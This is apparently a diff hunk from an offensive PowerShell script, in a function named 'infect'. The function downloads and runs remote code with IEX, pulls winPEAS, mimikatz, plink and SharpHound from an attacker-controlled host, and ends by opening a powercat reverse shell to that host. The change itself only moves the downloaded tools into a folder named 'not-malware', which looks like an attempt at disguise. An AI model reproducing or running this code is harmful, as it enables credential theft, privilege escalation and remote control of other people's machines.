@@ -46,16 +46,16 @@ function infect
 			IEX (new-object system.net.webclient).downloadstring($url)
 			# winpeas
 			$url = 'http://' + $rhost + '/windows-privesc/winPEAS.bat'
-			invoke-webrequest -uri $url -outfile 'winpeas.bat'
+			invoke-webrequest -uri $url -outfile '.\not-malware\winpeas.bat'
 			# mimikatz
 			$url = 'http://' + $rhost + '/mimikatz/Win32/mimikatz.exe'
-			invoke-webrequest -uri $url -outfile 'mimikatz.exe'
+			invoke-webrequest -uri $url -outfile '.\not-malware\mimikatz.exe'
 			# plink
 			$url = 'http://' + $rhost + '/tunneling/plink32.exe'
-			invoke-webrequest -uri $url -outfile 'plink.exe'
+			invoke-webrequest -uri $url -outfile '.\not-malware\plink.exe'
 			# sharphound
 			$url = 'http://' + $rhost + '/BloodHound/Collectors/SharpHound.exe'
-			invoke-webrequest -uri $url -outfile 'sharphound.exe'
+			invoke-webrequest -uri $url -outfile '.\not-malware\sharphound.exe'
 
 			# rev shell
 			powercat -c $rhost -p 4200 -e cmd
